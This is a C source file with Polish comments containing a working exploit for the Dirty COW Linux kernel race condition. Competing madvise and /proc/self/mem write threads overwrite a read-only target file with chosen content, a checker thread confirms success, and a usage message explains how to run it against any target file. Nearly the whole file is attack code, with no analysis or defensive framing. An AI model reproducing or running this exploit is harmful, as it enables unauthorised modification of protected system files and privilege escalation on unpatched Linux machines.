/*
####################### DIRTY COW Y #######################
$ gcc -pthread dirtycowy.c -o dirtycowy
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#define LOOP 100000000

void* map;
int f;
struct stat st;
size_t filesize;
volatile int result = 0; // 0 - w trakcie, 1 - sukces, -1 - failed
char* filename_original;
char* filename_new;
int checking_done = 1; //czy sprawdzać stan nadpisania w trakcie

char* readFileContentAndSize(char* filename, int* size) {
    char* content = NULL;

    int fd = open(filename, O_RDONLY);

    if (fd == -1) {
        printf("[ERROR] error opening new_content_file\n");
        return NULL;
    }

    struct stat stFile;
    fstat(fd, &stFile);

    int filesize = stFile.st_size;
    *size = filesize;

    content = (char*) malloc(sizeof(char) * (filesize + 1));
    content[filesize] = 0;

    int bytes_read = read(fd, content, filesize);

    if (bytes_read != filesize) {
        printf("[ERROR] error reading file, bytes_read: %d, filesize: %d\n", bytes_read, filesize);
        return NULL;
    }
    close(fd);

    return content;
}

int filesAreEqual(char* file1, char* file2) {
    int filesize1;
    char* content1 = readFileContentAndSize(file1, &filesize1);
    if (content1 == NULL) {
        return -1; //ERROR
    }

    int filesize2;
    char* content2 = readFileContentAndSize(file2, &filesize2);
    if (content2 == NULL) {
        return -1; //ERROR
    }

    if (filesize1 != filesize2) {
        return 0;
    }

    for (int i = 0; i < filesize1; i++) {
        char c1 = content1[i];
        char c2 = content2[i];
        if (c1 != c2) {
            return 0;
        }
    }

    return 1;
}

void* madviseThread(void* arg) {
    int i, c = 0;
    for (i = 0; i < LOOP; i++) {

        c += madvise(map, filesize, MADV_DONTNEED);

        if (result != 0) {
            printf("[debug] exiting madviseThread\n");
            return NULL;
        }
    }
    result = -1;
    printf("[ERROR] madviseThread loop finished - madvise %d\n", c);
    return NULL;
}

void* procselfmemThread(void* arg) {
    char* str = (char*) arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for (i = 0; i < LOOP; i++) {
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, filesize);

        if (result != 0) {
            printf("[debug] exiting procselfmemThread\n");
            return NULL;
        }
    }
    result = -1;
    printf("[ERROR] procselfmemThread loop finished - procselfmem %d\n", c);
    return NULL;
}


//wątek sprawdzający czy wszystko się już nadpisało
void* checkingDoneThread(void* arg) {

    for (int i = 0; i < LOOP; i++) {

        usleep(100000); // wait 100 ms

        if (filesAreEqual(filename_original, filename_new) == 1) {
            printf("SUCCESS - file overwritten !!!\n");
            result = 1;
        }

        if (result != 0) {
            printf("[debug] exiting checkingDoneThread\n");
            return NULL;
        }
    }

    return NULL;
}


int main(int argc, char* argv[]) {

    if (argc < 4) {
        printf("usage:\n");
        printf("dirtycowy overwrite <target_file> <new_file>\n");
        printf("dirtycowy overwrite <target_file> <new_file> --no-checking-done\n");
        printf("dirtycowy compare <file1> <file2>\n");
        return 1;
    }

    //opcja porównania plików
    if (strcmp(argv[1], "compare") == 0) {
        printf("Comparing files...\n");

        int result = filesAreEqual(argv[2], argv[3]);

        //TODO podanie rozmiarów plików

        if (result == -1) {
            printf("[ERROR] Comparing error.\n");
        } else if (result == 0) {
            printf("Files are different.\n");
        } else if (result == 1) {
            printf("Files are equal.\n");
        }

        return 0;
    } else if (strcmp(argv[1], "overwrite") == 0) {

        if (argc >= 5) {
            // włączenie / wyłączenie sprawdzania, czy udało się nadpisać
            if (strcmp(argv[4], "--no-checking-done") == 0) {
                checking_done = 0;
            } else if (strcmp(argv[4], "--checking-done") == 0) {
                checking_done = 1;
            }
        }

    } else {
        printf("[ERROR] Unknown command: %s\n", argv[1]);
        return -1;
    }

    if (checking_done == 1) {
        printf("Checking overwriting status on\n");
    }

    filename_original = argv[2];
    filename_new = argv[3];

    pthread_t pth1, pth2, pth3;

    // open the file in read only mode.
    f = open(filename_original, O_RDONLY);
    fstat(f, &st);

    filesize = st.st_size;

    // wczytanie pliku z nowa zawartoscia
    int filesize2;
    char* newContent = readFileContentAndSize(filename_new, &filesize2);
    if (newContent == NULL) {
        return 1;
    }

    if (filesize2 != filesize) {
        printf("[warn] new file size (%d) and old file size (%d) differ\n", filesize2,
               (int) filesize);
        if (filesize2 > filesize) {
            filesize = filesize2;
        } else {
            //TODO dopisanie 0 lub NOPów
            return 1;
        }
    }

    // use MAP_PRIVATE for copy-on-write mapping, open with PROT_READ
    map = mmap(NULL, filesize, PROT_READ, MAP_PRIVATE, f, 0);

    printf("Uwaga, napierdalam dirty cow...\n");

    pthread_create(&pth1, NULL, madviseThread, filename_original);
    pthread_create(&pth2, NULL, procselfmemThread, newContent);
    if (checking_done == 1) {
        pthread_create(&pth3, NULL, checkingDoneThread, newContent);
    }

    // wait for the threads to finish.
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    if (checking_done == 1) {
        pthread_join(pth3, NULL);
    }

    if (result != 1) {
        printf("[ERROR] failed to overwrite the file\n");
    }

    return 0;
}
